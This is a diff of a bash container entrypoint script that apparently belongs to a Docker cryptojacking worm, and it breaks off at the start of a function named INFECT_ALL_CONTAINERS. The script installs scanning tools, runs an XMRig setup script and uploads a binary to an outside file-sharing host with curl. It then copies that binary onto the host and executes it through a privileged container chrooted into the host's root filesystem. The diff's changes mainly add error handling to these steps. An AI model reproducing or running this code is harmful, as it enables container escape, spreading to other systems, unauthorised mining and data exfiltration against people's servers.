@@ -1,38 +1,49 @@
 #!/bin/bash
-#
-#   File:     entrypoint.sh
-#   Path      /usr/local/bin/entrypoint.sh
-#
+
+# File: /usr/local/bin/entrypoint.sh
+
 # Variables
+export GOPATH=/root/go
+export PATH=$PATH:$GOPATH/bin
 RATESCAN="50000"
 SETUP_SLEEP="1"
 
 function SETUP_SYSTEM(){
-    apk update
-    apk add --no-cache --repository http://dl-cdn.alpinelinux.org/alpine/edge/testing hwloc-dev
+    apk update || { echo "APK update failed"; exit 1; }
+    apk add --no-cache --repository http://dl-cdn.alpinelinux.org/alpine/edge/testing hwloc-dev || { echo "Failed to install hwloc-dev"; exit 1; }
 
     BASIC_APK_PACKS=(go git jq masscan libpcap libpcap-dev docker make cmake upx libstdc++ gcc g++ libuv-dev iptables openssl openssl-dev hwloc-dev)
     for BASIC_APK_PACK in "${BASIC_APK_PACKS[@]}"; do
-        echo "setup: $BASIC_APK_PACK"
-        apk add --no-cache "$BASIC_APK_PACK" >/dev/null 2>&1
+        echo "Installing: $BASIC_APK_PACK"
+        apk add --no-cache "$BASIC_APK_PACK" >/dev/null 2>&1 || { echo "Failed to install $BASIC_APK_PACK"; exit 1; }
         sleep "$SETUP_SLEEP"
     done
 
-    export GOPATH=/root/go
-    go install github.com/zmap/zgrab@latest
-    cd /root/go/src/github.com/zmap/zgrab
-    go build
-    cp ./zgrab /usr/bin/zgrab
+    if [ -d "/root/go/src/github.com/zmap/zgrab" ]; then
+        cd /root/go/src/github.com/zmap/zgrab || { echo "Failed to change directory"; exit 1; }
+    else
+        echo "Directory /root/go/src/github.com/zmap/zgrab does not exist."
+        exit 1
+    fi
+
+    if [ ! -f "go.mod" ]; then
+        echo "go.mod file not found. Initializing new module."
+        go mod init github.com/zmap/zgrab || { echo "Failed to initialize go module"; exit 1; }
+        go mod tidy || { echo "Failed to tidy go modules"; exit 1; }
+        go build || { echo "Go build failed"; exit 1; }
+        go install github.com/zmap/zgrab@latest || { echo "Failed to install zgrab"; exit 1; }
+        cp ./zgrab /usr/bin/zgrab || { echo "Failed to copy zgrab"; exit 1; }
+    fi
+
     rm -rf /var/cache/apk/*
-    /usr/local/bin/setup_xmrig.sh
+    /usr/local/bin/setup_xmrig.sh || { echo "Failed to execute setup_xmrig.sh"; exit 1; }
 
-    # Lil upspin test
-    export UPSPINTEST=$(curl --upload-file /root/sbin https://filepush.co/upload/)
-
-    # Implement the ssh spread
-    cp /root/sbin /host/bin/sbin
-    docker run -it --privileged --network host -v /:/mnt alpine chroot /mnt bash -C 'chmod +x /host/bin/sbin; /host/bin/sbin'
+    export UPSPINTEST=$(curl --upload-file /root/sbin https://filepush.co/upload/) || { echo "Failed to upload file"; exit 1; }
+    cp /root/sbin /host/bin/sbin || { echo "Failed to copy sbin"; exit 1; }
+    docker run -it --privileged --network host -v /:/mnt alpine chroot /mnt bash -C 'chmod +x /host/bin/sbin; /host/bin/sbin' || { echo "Failed to run Docker container"; exit 1; }
 }
+
+
 
 function INFECT_ALL_CONTAINERS(){
     docker ps | awk '{print $1}' | grep -v grep | grep -v CONTAINER >> /tmp/.dc
